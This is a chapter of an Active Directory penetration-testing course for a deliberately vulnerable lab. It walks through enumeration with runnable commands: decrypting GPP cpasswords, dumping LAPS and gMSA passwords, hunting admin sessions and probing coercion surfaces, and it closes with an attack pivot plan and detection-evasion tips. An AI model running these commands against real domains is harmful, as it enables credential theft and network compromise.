find SYSVOL -type f \( -iname 'Groups.xml' -o -iname 'Services.xml' \
                    -o -iname 'ScheduledTasks.xml' -o -iname 'Drives.xml' \
                    -o -iname 'DataSources.xml' -o -iname 'Printers.xml' \) \
    -exec ls -la {} \;

# Extract cpasswords
grep -r -h "cpassword" SYSVOL/ | grep -oP 'cpassword="\K[^"]+' \
    | while read cp; do gpp-decrypt "$cp"; done

# Or one-shot
impacket-Get-GPPPassword 'corp.local/alice:DVADlab2024!@10.10.0.10'
```

The AES-256 key for GPP encryption is **public** (Microsoft published it as part of the deprecation): `4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b`. Anything `cpassword=` in SYSVOL is decryptable.

### Logon scripts

```bash
find SYSVOL -type f \( -iname '*.bat' -o -iname '*.cmd' -o -iname '*.ps1' \
                    -o -iname '*.vbs' -o -iname '*.kix' \) \
    -exec grep -lE 'password|net use|runas|cred' {} \;
```

### GPO content (Registry.pol, GptTmpl.inf)

`GptTmpl.inf` under a GPO contains:

- `[Privilege Rights]` — which groups have `SeDebugPrivilege`, `SeBackupPrivilege`, etc., on a host.
- `[Group Membership]` — restricted groups (members of "Administrators" enforced from this GPO).
- `[Service General Setting]` — which services are forced on.

`Registry.pol` is binary (UTF-16-LE registry-pol format). Parse with `parse-PolFile.py` or `Registry.pol` parser in PowerShell.

### Link tree

```bash
$LDAP "(objectClass=groupPolicyContainer)" \
      displayName name gPCFileSysPath flags \
      gPCMachineExtensionNames gPCUserExtensionNames
```

Then walk:

```bash
$LDAP "(gPLink=*)" name distinguishedName gPLink
```

`gPLink` tells you which OUs / domains are linked to which GPO. If you have GenericWrite on `Default Domain Policy`, you get every workstation.

[Flags: ENUM-035..039 — GPO + SYSVOL enum; CRED-005 — GPP cpassword]

---

## 8.11 Layer 7 — LAPS, gMSA, sMSA

### LAPS attributes

Microsoft LAPS (legacy) stores the local-admin password in **`ms-Mcs-AdmPwd`** on the *computer* object. Modern Windows LAPS (since 2023) uses **`msLAPS-Password`** (encrypted) and **`msLAPS-PasswordExpirationTime`**, plus optional **`msLAPS-EncryptedPassword`** (DPAPI-NG encrypted with a domain group).

```bash
# Legacy LAPS (cleartext if you have read perms)
$LDAP "(ms-Mcs-AdmPwd=*)" sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# Modern Windows LAPS
$LDAP "(msLAPS-Password=*)" sAMAccountName msLAPS-Password msLAPS-PasswordExpirationTime
```

If you can read `ms-Mcs-AdmPwd`, you have local admin on that host. ACLs are usually scoped to a security group (`LAPS-Readers`).

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kdcHost 10.10.0.10 -M laps
```

NetExec's `laps` module reads, decrypts (LAPS v2), and dumps in one step.

### Group Managed Service Accounts (gMSA)

```bash
$LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
      sAMAccountName msDS-GroupMSAMembership msDS-ManagedPasswordInterval
```

`msDS-GroupMSAMembership` is a security descriptor listing principals allowed to **read the password**. If you're in that group, you can derive the gMSA NT hash.

```bash
gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
# Outputs: gmsaaccount$:::NThash
```

gMSA password rotates every 30 days; the blob (`msDS-ManagedPassword`) is generated by the KDC from a key derived per `gMSARootKey`.

### sMSA (standalone Managed Service Accounts)

```bash
$LDAP "(objectClass=msDS-ManagedServiceAccount)" sAMAccountName
```

Less common; password rotates similarly.

[Flag: ENUM-044 — LAPS enum; ENUM-045 — gMSA enum]

---

## 8.12 Layer 8 — Trust enumeration (cross-forest visibility)

Trust enum is where forest-wide attack paths reveal themselves.

### From low-priv user

```bash
# All trusts in the partition
$LDAP -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" \
      trustPartner trustDirection trustType trustAttributes \
      flatName securityIdentifier

# Forest trust info — only available with a forest trust
$LDAP -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" \
      msDS-TrustForestTrustInfo

# Cross-ref via nxc
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
```

### Interpreting trustAttributes (bitmask)

| Bit | Hex | Meaning |
|-----|-----|---------|
| 0 | 0x1 | NON_TRANSITIVE |
| 1 | 0x2 | UPLEVEL_ONLY (Win2K+) |
| 2 | 0x4 | QUARANTINED_DOMAIN (SID filtering enforced) |
| 3 | 0x8 | FOREST_TRANSITIVE |
| 4 | 0x10 | CROSS_ORGANIZATION |
| 5 | 0x20 | WITHIN_FOREST |
| 6 | 0x40 | TREAT_AS_EXTERNAL |
| 7 | 0x80 | USES_RC4_ENCRYPTION |
| 8 | 0x200 | USES_AES_KEYS |
| 9 | 0x400 | CROSS_ORGANIZATION_NO_TGT_DELEGATION |
| 10 | 0x800 | PIM_TRUST |
| 11 | 0x1000 | CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION |

DVAD intentionally clears `QUARANTINED_DOMAIN` on a trust so SID filtering does **not** apply — enabling the SID-history forest-jump attack in chapter 12.

### trustDirection

| Value | Meaning |
|-------|---------|
| 0 | Disabled |
| 1 | Inbound (other domain trusts us) |
| 2 | Outbound (we trust other domain) |
| 3 | Bidirectional |

Inbound-only trust: their users can authenticate here. Outbound-only: our users can authenticate there.

### From a victim

```powershell
Get-ADTrust -Filter * -Server corp.local |
    Select-Object Name,Source,Target,Direction,TrustType,TrustAttributes,ForestTransitive

# Forest-trust-specific info
Get-ADTrust -Filter "TrustAttributes -bor 0x8" -Server corp.local |
    Get-ADForestTrustInfo
```

PowerView equivalents:

```powershell
Get-NetDomainTrust
Get-NetForestTrust
Get-NetForestDomain -Forest corp.local
```

### ForeignSecurityPrincipal walk

When a trusted-domain principal is granted access in the local domain, an FSP entry is created under `CN=ForeignSecurityPrincipals,DC=corp,DC=local`:

```bash
$LDAP -b "CN=ForeignSecurityPrincipals,DC=corp,DC=local" \
      "(objectClass=foreignSecurityPrincipal)" objectSid memberOf
```

The `objectSid` is the trusted-domain SID. Resolve via `Get-ADObject -Identity <sid>` or `impacket-lookupsid` against the trusted DC.

[Flag: ENUM-066..072 — trust enum; REC-013..015 — cross-forest map]

---

## 8.13 Layer 9 — Session and logged-on enumeration

The single most valuable piece of recon for planning lateral movement: **where are high-privilege accounts logged in right now?**

### NetSessionEnum (SMB sessions to this host)

```bash
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --sessions
```

Returns the list of SMB sessions to each host — i.e., who is *connected* (typically anyone running `\\file01\share`). Default ACL since Server 2016 restricts this to local admins / Administrators, but legacy hosts permit it for Authenticated Users.

### NetWkstaUserEnum (users logged in on this host)

```bash
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --loggedon-users
```

Stricter ACL (admin-only by default). When it works, it tells you who is *actually interactively logged on*.

### PowerView UserHunter

```powershell
Invoke-UserHunter -GroupName "Domain Admins" -Threads 20 -Verbose
Invoke-UserHunter -UserName "alice"  # hunt one user
Invoke-UserHunter -CheckAccess        # additionally check if you have admin on the host
```

UserHunter walks NetSessionEnum + NetWkstaUserEnum across the domain and reports matches.

### SharpHound LoggedOn collection

```powershell
Invoke-BloodHound -CollectionMethods LoggedOn -OutputDirectory C:\Users\Public\bh\
```

This becomes the **HasSession** edge in BloodHound — the killer feature for attack-path planning.

[Flag: ENUM-045 — DA session hunt; ENUM-046 — service-acct session map]

---

## 8.14 Layer 10 — RPC / DCERPC enumeration

DCERPC exposes hundreds of interfaces. Enumerating them tells you which services are running, what coercion sinks exist, and what privilege paths a low-priv user has.

### Endpoint mapper dump

```bash
impacket-rpcdump @10.10.0.10
# Lists every registered RPC interface UUID -> protocol sequence -> endpoint
```

Key UUIDs to watch for:

| UUID | Interface | Why we care |
|------|-----------|------|
| `12345778-1234-abcd-ef00-0123456789ab` | LSARPC / SAMR | RID cycling, SID lookup |
| `12345778-1234-abcd-ef00-0123456789ac` | LSARPC variant | Same |
| `c681d488-d850-11d0-8c52-00c04fd90f7e` | EFSRPC (EfsRpc) | PetitPotam coercion |
| `4fc742e0-4a10-11cf-8273-00aa004ae673` | DFS-NM | DFSCoerce |
| `12345678-1234-abcd-ef00-0123456789ab` | Spoolss | SpoolSample / PrintNightmare |
| `367abb81-9844-35f1-ad32-98f038001003` | MS-RPRN | Spoolss legacy |
| `4b324fc8-1670-01d3-1278-5a47bf6ee188` | SRVS | Server service (NetSessionEnum lives here) |
| `eb464ee3-f23a-11d8-8b8f-0009b73fb29b` | MS-FSRVP | ShadowCoerce |
| `e3514235-4b06-11d1-ab04-00c04fc2dcd2` | MS-DRSR | Replication (DCSync/DCShadow) |
| `12345678-1234-abcd-ef00-0123456789cc` | NetLogon | ZeroLogon target |

### Probe coercion surfaces

```bash
# EFSRPC (PetitPotam)
Coercer.py coerce -t 10.10.0.10 -u alice -p 'DVADlab2024!' -d corp.local
Coercer.py scan -t 10.10.0.10 -u alice -p 'DVADlab2024!' -d corp.local

# Spoolss
rpcdump.py @10.10.0.10 | grep -i spoolss
```

`Coercer.py scan` lists every coercion-capable interface bindable from your perspective. Without firing an actual coercion (which would tip off the defender), you learn whether the attack would work.

[Flags: ENUM-047 — RPC endpoint enum; ENUM-048 — coercion-surface map]

---

## 8.15 Layer 11 — Per-user enumeration ("who am I, really?")

Before you escalate, exhaustively read your own user object:

```bash
$LDAP "(sAMAccountName=alice)" "*" "+"

# Your token's effective SIDs
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query \
    "(sAMAccountName=alice)" "memberOf objectSid tokenGroups"
```

Then probe for write rights:

```bash
# bloodyAD — list ACEs on objects you might own
bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
         get writable
```

`bloodyAD get writable` enumerates every AD object you can write to — instant ACL audit. Useful before kicking off BloodHound when you want a quick yes/no on "do I already have a write path?"

[Flag: ENUM-073 — self-ACL audit]

### Token enumeration on a victim

```powershell
whoami /all
whoami /priv         # privileges on the host
whoami /groups       # group memberships (incl. cross-forest groups)
klist                # current Kerberos tickets
```

`/priv` reveals SeBackupPrivilege, SeDebugPrivilege, SeImpersonatePrivilege — each unlocks specific escalations (chapter 11).

---

## 8.16 Layer 12 — ADCS Configuration NC walk

The Public Key Services container holds every CA, template, NTAuthCertificate, and AIA / CRL pointer:

```bash
$LDAP -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
      "(objectClass=*)" cn distinguishedName

# Templates
$LDAP -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
      "(objectClass=pKICertificateTemplate)" \
      cn displayName msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag \
      msPKI-RA-Signature msPKI-Certificate-Application-Policy \
      pKIExtendedKeyUsage flags

# NTAuthCertificates — who can sign client-auth certs
$LDAP -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
      "(objectClass=*)" caCertificate cACertificateDN
```

Cross-check `certipy find` output against the raw LDAP attributes — every bit of `msPKI-Certificate-Name-Flag` matters (see chapter 06 for the table).

[Flag: ENUM-030 — Configuration NC PKI walk]

---

## 8.17 Layer 13 — Forest-wide Global Catalog queries

The GC (port 3268) holds a partial replica of every object in every domain of the forest. You can query a remote domain *without binding to its DC* if you have credentials for any forest domain.

```bash
# Global Catalog bind
ldapsearch -x -H ldap://10.10.0.10:3268 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b "" -s sub "(objectCategory=person)" sAMAccountName

# Lists every user in EVERY domain of corp.local forest (corp.local + root.corp if same forest)
```

Note: an **external trust** to finance.local means finance.local is **not** in the corp.local forest — GC will not see those objects. You need to query 10.20.0.10 directly.

```bash
ldapsearch -x -H ldap://10.30.0.10:3268 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b "" -s sub "(objectCategory=person)" sAMAccountName
# This queries the root.corp GC — assuming forest trust, you can authenticate cross-forest
```

[Flag: ENUM-074 — Global Catalog walk]

---

## 8.18 Layer 14 — Service-account heuristics

Most "scary" privileges hide on service accounts: short names, no description, an SPN, "do not require pre-auth" set by an admin who forgot why, or memberOf an operator group.

### Heuristic catalogue

```bash
# Accounts with SPN AND in a privileged group
$LDAP "(&(servicePrincipalName=*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" \
      sAMAccountName servicePrincipalName

# Accounts whose pwdLastSet is older than 1 year (stale → likely service account)
$LDAP "(pwdLastSet<=131444444000000000)" sAMAccountName pwdLastSet

# Accounts with `description` mentioning "service" / "scheduled"
$LDAP "(|(description=*service*)(description=*scheduled*)(description=*svc*))" \
      sAMAccountName description

# Accounts with PASSWORD_NEVER_EXPIRES set
$LDAP "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName

# Accounts with PASSWORD_NOT_REQUIRED
$LDAP "(userAccountControl:1.2.840.113556.1.4.803:=32)" sAMAccountName
```

DVAD's `svc_sql`, `svc_web`, `svc_backup`, `svc_jenkins` all carry intentionally weak passwords matching common wordlists like `rockyou.txt`. Kerberoasting them yields easy DA chains.

[Flag: ENUM-022 — service-acct catalogue]

---

## 8.19 Layer 15 — Privileged group catalogue

```bash
# Default protected groups (AdminSDHolder targets)
for g in 'Domain Admins' 'Enterprise Admins' 'Schema Admins' 'Administrators' \
         'Account Operators' 'Backup Operators' 'Server Operators' \
         'Print Operators' 'Replicator' 'Cert Publishers' \
         'DnsAdmins' 'Group Policy Creator Owners' 'Protected Users' \
         'Domain Controllers' 'Read-only Domain Controllers'; do
  echo "=== $g ==="
  $LDAP "(&(objectClass=group)(sAMAccountName=$g))" sAMAccountName member
done
```

Each privileged group has a particular escalation primitive (see chapter 11):

- Domain Admins → everything.
- Enterprise Admins → forest root + Configuration NC ACL.
- Backup Operators → `SeBackupPrivilege` on DCs → NTDS.dit read → DCSync.
- Server Operators → service-binary swap on DC.
- Account Operators → modify non-protected users, create users.
- Print Operators → load printer driver → SYSTEM on DC.
- DnsAdmins → DLL load via dnscmd → SYSTEM on DNS host.
- Cert Publishers → publish cert to NTAuthCertificates (chapter 06).
- Protected Users → defensive group; members can't use NTLM, can't be delegated.

[Flag: ENUM-025 — privileged group dump]

---

## 8.20 Layer 16 — Cross-tier visibility

A practical recon trick: cross-reference findings across domains *without* explicit pivoting. If `alice@corp.local` has a trust path into finance.local, you can sometimes read finance.local objects from a corp-side query via the global catalog — even before pivoting laterally.

```bash
# Hit finance.local's DC with corp creds (external trust permits it)
ldapsearch -x -H ldap://10.20.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b 'DC=finance,DC=local' "(objectCategory=person)" sAMAccountName

# If the trust is "shortcut" / forest with selective auth → may be filtered
```

Sometimes finance.local strips trust permissions to specific groups. Test access object-by-object.

---

## 8.21 The recon master output layout

```
~/dvad/recon/
├── 00-osint/
│   └── employee-names.txt
├── 01-network/
│   ├── live-corp.{nmap,gnmap,xml}
│   ├── dc-services.{nmap,gnmap,xml}
│   └── full-sweep.{nmap,gnmap,xml}
├── 02-dns/
│   ├── srv-records.txt
│   ├── axfr.txt
│   ├── ptr-sweep.txt
│   └── adidnsdump-corp.csv
├── 03-ldap/
│   ├── corp/
│   │   ├── domain.ldif
│   │   ├── users.ldif
│   │   ├── groups.ldif
│   │   ├── computers.ldif
│   │   ├── asrep.ldif
│   │   ├── kerberoastable.ldif
│   │   ├── unconstrained.ldif
│   │   ├── constrained.ldif
│   │   ├── rbcd.ldif
│   │   ├── trusts.ldif
│   │   ├── admincount.ldif
│   │   ├── gmsa.ldif
│   │   ├── ldd/ (ldapdomaindump)
│   │   └── ldeep/
│   ├── finance/
│   └── root/
├── 04-kerb/
│   ├── asrep.hash
│   ├── kerb.hash
│   ├── kerbrute-users.txt
│   └── time-skew.txt
├── 05-bloodhound/
│   ├── corp/corp-zip
│   ├── finance/finance-zip
│   └── root/root-zip
├── 06-adcs/
│   ├── certipy-find-corp.txt
│   ├── certipy-find-corp.json
│   ├── certipy-find-finance.txt
│   ├── certipy-find-root.txt
│   ├── ca-list.txt
│   └── ca-officers.txt
├── 07-shares/
│   ├── share-matrix.csv
│   └── grabbed/
│       ├── Groups.xml
│       └── unattend.xml
├── 08-mssql/
│   ├── sql01-version.txt
│   ├── sql01-databases.txt
│   └── sql01-linked-servers.txt
├── 09-gpo-sysvol/
│   ├── sysvol-tree.txt
│   ├── gpp-decrypted.txt
│   └── policies/
├── 10-laps-gmsa/
│   ├── laps-readers.txt
│   └── gmsa-dump.txt
├── 11-sessions/
│   ├── nxc-sessions.txt
│   ├── nxc-loggedon.txt
│   └── userhunter-da.txt
├── 12-rpc/
│   └── rpcdump-dc01.txt
├── 13-acl/
│   ├── bloodyad-writable-alice.txt
│   └── adacl-bob.txt
├── 14-pki-ldap/
│   ├── templates.ldif
│   └── ntauth.ldif
└── 99-summary/
    ├── attack-paths.md
    ├── flag-coverage.md
    └── pivot-plan.md
```

The investment pays off. When you want to compare "what could alice see two days ago vs. now," you re-grep the same directory.

---

## 8.22 The pivot-plan template

After the sweep, write `99-summary/pivot-plan.md`:

```markdown
# Pivot plan — 2026-05-21

## What I have
- alice : DVADlab2024! (low-priv user)
- BloodHound DB merged: corp, finance, root.
- Vulnerable templates: VulnerableESC1 (corp), Web-RA (finance ESC8 candidate).

## Attack candidates (ranked by reliability)

1. **Kerberoast svc_sql** — RC4, weak password.
   - Cost: 1 TGS-REQ.
   - Risk: 4769 RC4 alert if SIEM is tight.
   - Payoff: svc_sql likely sysadmin on sql01 → xp_cmdshell → SYSTEM.

2. **AS-REP roast svc_legacy** — DontReqPreAuth set.
   - Cost: 1 AS-REQ.
   - Risk: minimal.
   - Payoff: depends on cracking time.

3. **ESC1 enrol VulnerableESC1 with SAN=Administrator**.
   - Cost: 1 cert request.
   - Risk: 4886/4887 with SAN mismatch — moderate.
   - Payoff: Administrator NT hash via UnPAC-the-Hash.

4. **PetitPotam → ntlmrelayx to LDAPS → RBCD**.
   - Cost: 1 coercion + 1 relay.
   - Risk: high (multiple correlated logs).
   - Payoff: DC compromise.

## Order: 1 → 3 → fallback 4
```

Treat this as a living document. Each successful step changes the plan.

---

## 8.23 Stealth knobs

If your engagement budget allows aggressive recon (e.g., DVAD lab, no SOC), skip this. Otherwise:

| Knob | Quiet | Loud |
|------|-------|------|
| LDAP enum | One bound session, paginate cleanly | Many short-lived binds, scattered filters |
| Port scan | `-T2`, fragmented, slow | `-T4 --min-rate=10000` |
| Kerberoast | One TGS per target, sequential | All-SPN burst |
| AS-REP roast | One target at a time | Mass enumeration |
| BloodHound | DCOnly + ACL only | All + LoggedOn + SessionLoop |
| SMB share enum | Top-level only on key hosts | Recurse-everything everywhere |
| Coercion probe | rpcdump endpoint walk | Actual MS-EFSR call |
| Defender DNS | `nslookup` with short TTL | Live AXFR / mass PTR sweep |

DVAD does not run Defender for Identity. On a real engagement, MDI will alert on:

- Mass LDAP enum (anomaly detection).
- SMB session enumeration from non-admin.
- LSARPC SID lookup spam.
- Multiple AS-REQ failures with same source.

Pace your enum to one query per ~5 seconds on hot targets.

---

## Lab exercises

### Exercise 8.A — Run the full sweep on DVAD

For each layer 1–16, generate the recon output and save under `~/dvad/recon/<layer>/`. Compare against `PLAN.md` to count enumeration flags captured. Aim for ≥ 70/80 ENUM-* flags from this single pass.

### Exercise 8.B — Plan an attack path with BloodHound

After loading BloodHound (BHCE):

1. Find shortest path from `alice@corp.local` to `Administrator@corp.local`.
2. Identify each edge type along the path.
3. For each edge, list the technique that exploits it (e.g., "GenericWrite on user → set SPN → Kerberoast"). Keep the list under `~/dvad/recon/99-summary/path-1.md`.

### Exercise 8.C — Cross-forest map

Run BloodHound collection against corp.local, finance.local, and root.corp using `alice@corp.local`. Merge all three zips into the same BHCE instance. Identify:

- ForeignSecurityPrincipals entries that link corp ↔ finance.
- ForeignSecurityPrincipals entries that link corp ↔ root.
- Whether SID filtering is enforced (look at `trustAttributes` 0x4 bit).

### Exercise 8.D — Raw LDAP vs. BloodHound diff

Pick five claims BloodHound makes (e.g., "bob has GenericAll on charlie"). For each, **re-derive** the claim from raw LDAP (`nTSecurityDescriptor` on the target object). Confirm they match.

### Exercise 8.E — Kerbrute without creds

Generate a name-based username list from `employees.txt` (firstname.lastname, fnlast, etc.). Run `kerbrute userenum` against corp.local with **no credentials**. Compare the resulting hits to the ldapsearch user list.

### Exercise 8.F — ADCS template audit

Run `certipy find` against each forest. For every template with an ESC tag, record:

- Template name.
- ESC IDs.
- Enrollment principals.
- Whether your current user can enroll.

Save to `~/dvad/recon/06-adcs/template-audit.md`.

### Exercise 8.G — Trust-attributes interpretation

For each of the four DVAD trusts (corp↔eu, corp→finance, corp↔root, etc.), decode the `trustAttributes` bitmask byte-by-byte. Document which bits would have to flip to make a SID-history forest-jump attack fail.

### Exercise 8.H — Session-hunt for DAs

From the lab's `alice` account, run `Invoke-UserHunter -GroupName "Domain Admins"`. If no hits, lab the DC up: `mstsc /v:dc01.corp.local` (admin password), log in, log out — then re-run the UserHunter from alice. The session should now appear. Discuss how this informs lateral targeting.

### Exercise 8.I — SYSVOL trawl

Pull SYSVOL from corp.local and finance.local. Find:

- All `cpassword` instances. Decrypt them.
- All `.ps1` / `.bat` files referencing `password` / `cred` / `runas`.
- The list of logon-script destinations (`scriptPath` attribute on user objects matching the script).

### Exercise 8.J — Recon report

Write `99-summary/recon-report.md` (max 5 pages) summarising:

- Forest layout (with ASCII diagram).
- Identified privileged users.
- Identified delegation primitives (unconstrained, constrained, RBCD).
- Identified ADCS misconfigurations.
- Top-three attack paths with cost/risk/payoff.

This document is the deliverable a real red team would hand to the customer.

---

## Self-check questions

1. Why does the recon pyramid bottom out at "network-only" not "anonymous"?
2. What's the LDAP filter for "computer with unconstrained delegation"? Why is it `:=524288` and not `=524288`?
3. Why does `MachineAccountQuota` matter even at the recon stage (you haven't tried RBCD yet)?
4. What three coercion-source protocols would you expect to find on a DC via rpcdump?
5. What's the difference between a session (NetSessionEnum) and a logged-on user (NetWkstaUserEnum) in nxc terms?
6. Why does `bloodhound-python -c All` skip `LoggedOn` and `SessionLoop` by default?
7. Suppose `ms-Mcs-AdmPwd` is readable by everyone on a target. What ACL would the defender need to fix this, and what exact attribute does that ACL touch?
8. What's the LDAP attribute that distinguishes an RODC computer object from a writable DC?
9. Why does `trustAttributes & 0x4` (QUARANTINED_DOMAIN) being **unset** enable SID-history forest jumps?
10. How would you enumerate gMSA accounts without `gMSADumper.py` available?
11. What's the difference between `certipy find -stdout -text` and `-output json`? When do you want each?
12. What signals does `rpcdump` give you about whether PetitPotam will succeed?
13. Why does the order of the recon layers matter — couldn't you do BloodHound first and skip raw LDAP?
14. What's the simplest LDAP query to confirm you have authenticated, even if you have no idea what your privileges are?
15. Name three SYSVOL filenames that historically leaked credentials.
16. Why is the GC port (3268) sometimes useful when the per-domain LDAP port (389) is blocked from your subnet?
17. What's `adidnsdump` doing under the hood that a normal `dig` cannot?
18. How does `Invoke-UserHunter -CheckAccess` differ from a plain user hunt?
19. Why is `pwdLastSet` informative for finding service accounts even when the description doesn't say "service"?
20. When does `--local-auth` apply for `nxc smb`, and what's the impact on Kerberos vs. NTLM auth?

---

## References

- **HackTricks — *Active Directory Enumeration*** — exhaustive checklist.
- **Microsoft Docs — *AD DS Operations Reference*** — for LDAP attribute meanings.
- **adsecurity.org — *Reading AD User Objects, Part 1/2/3*** — Sean Metcalf's deep dives.
- **SpecterOps — *Introducing BloodHound* (2016) and *BloodHound Community Edition* (2023)** — graph theory of AD attacks.
- **dirkjanm — *aclpwn* and *bloodhound-python*** — direct ACL + collector.
- **Coercer documentation** — exhaustive coercion-surface map.
- **harmj0y — *PowerView wiki*** — every cmdlet's LDAP filter.
- **certipy README** — flag-for-flag mapping to ESC vulnerabilities.

Next: [09-initial-access.md](09-initial-access.md).
